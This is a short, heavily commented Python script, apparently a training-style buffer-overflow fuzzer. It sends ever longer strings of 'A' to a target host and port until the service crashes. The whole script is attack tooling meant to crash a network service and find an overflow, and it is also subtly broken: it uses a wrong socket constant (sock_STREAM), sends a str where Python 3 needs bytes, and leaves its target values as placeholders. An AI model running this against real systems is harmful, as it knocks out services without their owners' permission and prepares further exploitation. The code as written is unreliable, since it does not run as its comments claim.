#!/usr/bin/python3
# Socket: Needed to send data to the port socket of the target host.
# Time: Needed to sleep X amount of seconds between requests as to not DOS the target host.
# Sys: Needed to exit the python program if we are unable to connect to the target host.
import socket, time, sys

# CHANGE THESE!!!
target_IP = [IP]
target_port = [port]

# Start with a fuzzing input size of 100 A's.
size = 100

# Continue to send data until the data length reaches 15,000 A's.
while (size < 15000):
  # Try statement that will send data until it receives an exception from the target host where it is no longer reachable because we crashed it.
  try:
    # Print out the size of each request being sent to the target host. 
    print ("\nSending buffer size %s" % size)
    
    # Define the fuzzing input of A's to the target host.
    input_buffer = "A" * size
    
    # Initialize and send input_buffer variable fuzzing data through the socket to the target host.
    s = socket.socket (socket.AF_INET, socket.sock_STREAM)
    s.connect((target_IP, target_port))
    s.send(input_buffer)
    s.close()
    
    # Print confirmation after a full socket creation, data sending, and tear down successfully occurs.
    print ("\nSent")
    
    # Increment the size variable by 100 units after each successfull data transfer to target host.
    size += 100
    
    # Sleep 2 seconds between each request to the target host as to not DOS it.
    time.sleep (2)
    
  # Except statement to catch when the target host program is not responding to data being sent to it.  Likely means that we successfully crashed it with our fuzzing input.  
  except:
    print ("\nCould not connect")
    # Exit the python program when we aren't able to send data to the target host.
    sys.exit()
